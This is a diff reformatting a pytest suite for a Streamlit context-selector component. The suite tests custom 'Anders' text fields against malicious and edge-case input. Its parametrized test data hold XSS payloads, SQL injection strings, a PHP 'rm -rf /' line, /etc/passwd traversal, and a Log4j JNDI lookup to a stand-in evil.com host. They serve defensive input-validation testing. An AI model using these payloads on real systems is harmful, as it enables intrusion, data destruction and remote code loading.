@@ -14,15 +14,16 @@ Test Coverage:
 - Browser compatibility scenarios
 """
 
-import pytest
+import gc
+import html
+import json
+import sys
 import threading
 import time
-import sys
-import gc
-from unittest.mock import Mock, patch, MagicMock
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import json
-import html
+from unittest.mock import MagicMock, Mock, patch
+
+import pytest
 
 from src.ui.components.context_selector import ContextSelector
 
@@ -30,36 +31,38 @@ from src.ui.components.context_selector import ContextSelector
 class TestMaliciousInputPrevention:
     """Test protection against malicious input in Anders fields."""
 
-    @pytest.fixture
+    @pytest.fixture()
     def mock_streamlit(self):
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
-            yield {
-                'multiselect': mock_multiselect,
-                'text_input': mock_text_input
-            }
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
+            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<script>alert('XSS')</script>",
-        "'; DROP TABLE definitions; --",
-        "<img src=x onerror=alert('XSS')>",
-        "javascript:alert('XSS')",
-        "<iframe src='http://evil.com'></iframe>",
-        "<?php system('rm -rf /'); ?>",
-        "<svg onload=alert('XSS')>",
-        "../../../../../../etc/passwd",
-        "%3Cscript%3Ealert('XSS')%3C/script%3E",
-        "<body onload=alert('XSS')>",
-        "onclick=alert('XSS')",
-        "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
-        "${jndi:ldap://evil.com/a}",  # Log4j style
-        "{{7*7}}",  # Template injection
-        "${7*7}",  # Expression injection
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<script>alert('XSS')</script>",
+            "'; DROP TABLE definitions; --",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<iframe src='http://evil.com'></iframe>",
+            "<?php system('rm -rf /'); ?>",
+            "<svg onload=alert('XSS')>",
+            "../../../../../../etc/passwd",
+            "%3Cscript%3Ealert('XSS')%3C/script%3E",
+            "<body onload=alert('XSS')>",
+            "onclick=alert('XSS')",
+            "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
+            "${jndi:ldap://evil.com/a}",  # Log4j style
+            "{{7*7}}",  # Template injection
+            "${7*7}",  # Expression injection
+        ],
+    )
     def test_xss_prevention(self, mock_streamlit, malicious_input):
         """Test that XSS attempts are safely handled."""
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = malicious_input
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = malicious_input
 
         selector = ContextSelector()
         result = selector.render()
@@ -71,21 +74,24 @@ class TestMaliciousInputPrevention:
         escaped = html.escape(malicious_input)
         # This is what should be shown to user
 
-    @pytest.mark.parametrize("sql_injection", [
-        "'; DROP TABLE users; --",
-        "1' OR '1'='1",
-        "admin'--",
-        "' OR 1=1--",
-        "1'; DELETE FROM definitions WHERE '1'='1",
-        "' UNION SELECT * FROM passwords--",
-        "'; EXEC xp_cmdshell('dir'); --",
-        "\\'; DROP TABLE users; --",
-        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
-    ])
+    @pytest.mark.parametrize(
+        "sql_injection",
+        [
+            "'; DROP TABLE users; --",
+            "1' OR '1'='1",
+            "admin'--",
+            "' OR 1=1--",
+            "1'; DELETE FROM definitions WHERE '1'='1",
+            "' UNION SELECT * FROM passwords--",
+            "'; EXEC xp_cmdshell('dir'); --",
+            "\\'; DROP TABLE users; --",
+            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
+        ],
+    )
     def test_sql_injection_prevention(self, mock_streamlit, sql_injection):
         """Test that SQL injection attempts are safely handled."""
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = sql_injection
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = sql_injection
 
         selector = ContextSelector()
         result = selector.render()
@@ -104,8 +110,8 @@ class TestMaliciousInputPrevention:
         ]
 
         for cmd in command_injections:
-            mock_streamlit['multiselect'].return_value = ["Anders..."]
-            mock_streamlit['text_input'].return_value = cmd
+            mock_streamlit["multiselect"].return_value = ["Anders..."]
+            mock_streamlit["text_input"].return_value = cmd
 
             selector = ContextSelector()
             result = selector.render()
@@ -117,22 +123,21 @@ class TestMaliciousInputPrevention:
 class TestExtremeLengthInputs:
     """Test handling of extremely long inputs."""
 
-    @pytest.fixture
+    @pytest.fixture()
     def mock_streamlit(self):
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
-            yield {
-                'multiselect': mock_multiselect,
-                'text_input': mock_text_input
-            }
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
+            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}
 
     def test_very_long_single_word(self, mock_streamlit):
         """Test a single word that's extremely long."""
         # Create a 10,000 character "word"
         long_word = "A" * 10000
 
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = long_word
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = long_word
 
         selector = ContextSelector()
         result = selector.render()
@@ -145,8 +150,8 @@ class TestExtremeLengthInputs:
         # Create a 50,000 character text
         long_text = " ".join(["Word" + str(i) for i in range(10000)])
 
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = long_text
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = long_text
 
         selector = ContextSelector()
         result = selector.render()
@@ -159,8 +164,8 @@ class TestExtremeLengthInputs:
         # Use complex Unicode characters that take more bytes
         unicode_text = "🎉" * 5000 + "한글" * 2000 + "العربية" * 1000
 
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = unicode_text
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = unicode_text
 
         selector = ContextSelector()
         result = selector.render()
@@ -170,8 +175,8 @@ class TestExtremeLengthInputs:
 
     def test_zero_length_input(self, mock_streamlit):
         """Test empty string input."""
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = ""
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = ""
 
         selector = ContextSelector()
         result = selector.render()
@@ -191,15 +196,19 @@ class TestConcurrencyAndRaceConditions:
 
         def modify_anders(value):
             try:
-                with patch('streamlit.multiselect') as mock_multiselect, \
-                     patch('streamlit.text_input') as mock_text_input, \
-                     patch('streamlit.markdown') as _md, \
-                     patch('streamlit.selectbox') as _sb, \
-                     patch('streamlit.columns', return_value=[MagicMock(), MagicMock()]) as _cols, \
-                     patch('streamlit.expander', return_value=MagicMock()) as _exp, \
-                     patch('streamlit.checkbox', return_value=False) as _cb, \
-                     patch('streamlit.info') as _info, \
-                     patch('streamlit.warning') as _warn:
+                with (
+                    patch("streamlit.multiselect") as mock_multiselect,
+                    patch("streamlit.text_input") as mock_text_input,
+                    patch("streamlit.markdown") as _md,
+                    patch("streamlit.selectbox") as _sb,
+                    patch(
+                        "streamlit.columns", return_value=[MagicMock(), MagicMock()]
+                    ) as _cols,
+                    patch("streamlit.expander", return_value=MagicMock()) as _exp,
+                    patch("streamlit.checkbox", return_value=False) as _cb,
+                    patch("streamlit.info") as _info,
+                    patch("streamlit.warning") as _warn,
+                ):
 
                     mock_multiselect.return_value = ["Anders..."]
                     mock_text_input.return_value = f"Concurrent_{value}"
@@ -222,8 +231,10 @@ class TestConcurrencyAndRaceConditions:
 
     def test_rapid_selection_changes(self):
         """Test rapid changes between Anders and regular options."""
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
 
             selector = ContextSelector()
 
@@ -245,38 +256,40 @@ class TestConcurrencyAndRaceConditions:
 class TestUnicodeAndEncodingEdgeCases:
     """Test Unicode and encoding edge cases."""
 
-    @pytest.fixture
+    @pytest.fixture()
     def mock_streamlit(self):
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
-            yield {
-                'multiselect': mock_multiselect,
-                'text_input': mock_text_input
-            }
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
+            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}
 
-    @pytest.mark.parametrize("unicode_input", [
-        "🚀🎉🔥💯✨",  # Emojis
-        "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
-        "ℌ𝔢𝔩𝔩𝔬",  # Fraktur
-        "🄷🄴🄻🄻🄾",  # Enclosed alphanumerics
-        "Ｈｅｌｌｏ",  # Fullwidth
-        "ǝʃdɯɐxǝ",  # IPA extensions
-        "שָׁלוֹם",  # Hebrew with diacritics
-        "مرحبا",  # Arabic
-        "你好",  # Chinese
-        "こんにちは",  # Japanese
-        "안녕하세요",  # Korean
-        "สวัสดี",  # Thai
-        "Здравствуйте",  # Cyrillic
-        "Γεια σας",  # Greek
-        "\u202e\u202d",  # Right-to-left override characters
-        "\u0000\u0001\u0002",  # Control characters
-        "A\u0301\u0302\u0303\u0304",  # Combining diacriticals
-    ])
+    @pytest.mark.parametrize(
+        "unicode_input",
+        [
+            "🚀🎉🔥💯✨",  # Emojis
+            "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
+            "ℌ𝔢𝔩𝔩𝔬",  # Fraktur
+            "🄷🄴🄻🄻🄾",  # Enclosed alphanumerics
+            "Ｈｅｌｌｏ",  # Fullwidth
+            "ǝʃdɯɐxǝ",  # IPA extensions
+            "שָׁלוֹם",  # Hebrew with diacritics
+            "مرحبا",  # Arabic
+            "你好",  # Chinese
+            "こんにちは",  # Japanese
+            "안녕하세요",  # Korean
+            "สวัสดี",  # Thai
+            "Здравствуйте",  # Cyrillic
+            "Γεια σας",  # Greek
+            "\u202e\u202d",  # Right-to-left override characters
+            "\u0000\u0001\u0002",  # Control characters
+            "A\u0301\u0302\u0303\u0304",  # Combining diacriticals
+        ],
+    )
     def test_unicode_characters(self, mock_streamlit, unicode_input):
         """Test various Unicode character sets."""
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = unicode_input
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = unicode_input
 
         selector = ContextSelector()
         result = selector.render()
@@ -288,8 +301,8 @@ class TestUnicodeAndEncodingEdgeCases:
         """Test mixed LTR and RTL text."""
         mixed_text = "English العربية עברית Nederlands"
 
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = mixed_text
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = mixed_text
 
         selector = ContextSelector()
         result = selector.render()
@@ -301,8 +314,8 @@ class TestUnicodeAndEncodingEdgeCases:
         # Zero-width characters that could be used for fingerprinting
         zwc_text = "Nor\u200bmal\u200cTe\u200dxt\ufeff"
 
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = zwc_text
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = zwc_text
 
         selector = ContextSelector()
         result = selector.render()
@@ -316,13 +329,14 @@ class TestMemoryStress:
 
     def test_memory_leak_prevention(self):
         """Test that repeated Anders operations don't leak memory."""
-        import gc
         import tracemalloc
 
         tracemalloc.start()
 
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
 
             # Baseline
             gc.collect()
@@ -344,7 +358,7 @@ class TestMemoryStress:
             snapshot2 = tracemalloc.take_snapshot()
 
             # Check memory growth
-            stats = snapshot2.compare_to(snapshot1, 'lineno')
+            stats = snapshot2.compare_to(snapshot1, "lineno")
 
             # Memory growth should be minimal
             # This is a simplified check
@@ -352,8 +366,10 @@ class TestMemoryStress:
 
     def test_large_number_of_anders_fields(self):
         """Test handling many Anders fields simultaneously."""
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
 
             # Simulate many Anders selections
             large_selection = ["Option" + str(i) for i in range(1000)] + ["Anders..."]
@@ -370,19 +386,18 @@ class TestMemoryStress:
 class TestBoundaryConditions:
     """Test boundary conditions and limits."""
 
-    @pytest.fixture
+    @pytest.fixture()
     def mock_streamlit(self):
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
-            yield {
-                'multiselect': mock_multiselect,
-                'text_input': mock_text_input
-            }
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
+            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}
 
     def test_single_character_input(self, mock_streamlit):
         """Test single character custom input."""
-        mock_streamlit['multiselect'].return_value = ["Anders..."]
-        mock_streamlit['text_input'].return_value = "A"
+        mock_streamlit["multiselect"].return_value = ["Anders..."]
+        mock_streamlit["text_input"].return_value = "A"
 
         selector = ContextSelector()
         result = selector.render()
@@ -402,8 +417,8 @@ class TestBoundaryConditions:
         ]
 
         for ws in whitespace_inputs:
-            mock_streamlit['multiselect'].return_value = ["Anders..."]
-            mock_streamlit['text_input'].return_value = ws
+            mock_streamlit["multiselect"].return_value = ["Anders..."]
+            mock_streamlit["text_input"].return_value = ws
 
             selector = ContextSelector()
             result = selector.render()
@@ -421,8 +436,8 @@ class TestBoundaryConditions:
         ]
 
         for null_input in null_inputs:
-            mock_streamlit['multiselect'].return_value = ["Anders..."]
-            mock_streamlit['text_input'].return_value = null_input
+            mock_streamlit["multiselect"].return_value = ["Anders..."]
+            mock_streamlit["text_input"].return_value = null_input
 
             selector = ContextSelector()
             # Should handle without crashing
@@ -437,12 +452,14 @@ class TestStateCorruption:
 
     def test_corrupted_session_state_recovery(self):
         """Test recovery from corrupted session state."""
-        with patch('streamlit.session_state', create=True) as mock_session:
+        with patch("streamlit.session_state", create=True) as mock_session:
             # Corrupt the state
             mock_session.organisatorische_context_anders = {"not": "a string"}
 
-            with patch('streamlit.multiselect') as mock_multiselect, \
-                 patch('streamlit.text_input') as mock_text_input:
+            with (
+                patch("streamlit.multiselect") as mock_multiselect,
+                patch("streamlit.text_input") as mock_text_input,
+            ):
 
                 mock_multiselect.return_value = ["Anders..."]
                 mock_text_input.return_value = "Recovery test"
@@ -455,12 +472,12 @@ class TestStateCorruption:
 
     def test_partial_state_loss(self):
         """Test handling of partial state loss."""
-        with patch('streamlit.session_state', create=True) as mock_session:
+        with patch("streamlit.session_state", create=True) as mock_session:
             # Partial state
             mock_session.organisatorische_context = ["DJI"]
             # Missing: juridische_context, wettelijke_basis
 
-            with patch('streamlit.multiselect') as mock_multiselect:
+            with patch("streamlit.multiselect") as mock_multiselect:
                 mock_multiselect.return_value = ["OM", "Anders..."]
 
                 selector = ContextSelector()
@@ -475,8 +492,10 @@ class TestBrowserCompatibility:
 
     def test_ie11_compatibility_characters(self):
         """Test characters that might cause issues in IE11."""
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
 
             # Characters problematic in older browsers
             ie11_problematic = "→←↑↓♠♣♥♦€£¥"
@@ -491,8 +510,10 @@ class TestBrowserCompatibility:
 
     def test_mobile_autocorrect_artifacts(self):
         """Test handling of mobile autocorrect artifacts."""
-        with patch('streamlit.multiselect') as mock_multiselect, \
-             patch('streamlit.text_input') as mock_text_input:
+        with (
+            patch("streamlit.multiselect") as mock_multiselect,
+            patch("streamlit.text_input") as mock_text_input,
+        ):
 
             # Common autocorrect artifacts
             autocorrect_text = "Test... Test… Test′s"
@@ -511,7 +532,7 @@ class TestErrorRecovery:
 
     def test_recovery_from_render_error(self):
         """Test recovery when render partially fails."""
-        with patch('streamlit.multiselect') as mock_multiselect:
+        with patch("streamlit.multiselect") as mock_multiselect:
             # First call fails, then return valid selections for all multiselects
             def multiselect_side_effect(*args, **kwargs):
                 if not hasattr(multiselect_side_effect, "calls"):
@@ -520,7 +541,11 @@ class TestErrorRecovery:
                 if multiselect_side_effect.calls == 1:
                     raise Exception("Render failed")
                 # Subsequent calls: return valid lists for each multiselect
-                return ["DJI", "Anders..."] if "Organisatorische" in (args[0] if args else "") else []
+                return (
+                    ["DJI", "Anders..."]
+                    if "Organisatorische" in (args[0] if args else "")
+                    else []
+                )
 
             mock_multiselect.side_effect = multiselect_side_effect
 
@@ -538,11 +563,11 @@ class TestErrorRecovery:
 
     def test_graceful_degradation(self):
         """Test graceful degradation when features unavailable."""
-        with patch('streamlit.multiselect') as mock_multiselect:
+        with patch("streamlit.multiselect") as mock_multiselect:
             mock_multiselect.return_value = ["Anders..."]
 
             # Simulate text_input not available
-            with patch('streamlit.text_input', side_effect=AttributeError):
+            with patch("streamlit.text_input", side_effect=AttributeError):
                 selector = ContextSelector()
                 # Should degrade gracefully
                 result = selector.render()
